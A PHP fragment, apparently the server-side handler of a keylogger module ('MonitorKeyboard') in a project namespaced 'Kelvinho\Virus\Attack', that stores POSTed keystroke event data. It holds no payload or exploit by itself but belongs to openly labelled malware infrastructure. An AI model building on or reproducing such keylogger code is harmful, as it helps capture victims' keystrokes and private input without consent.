<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\Background\MonitorKeyboard\MonitorKeyboard $this */

$this->setSavedEvents($this->requestData->postCheck("savedEvents"))->saveState();
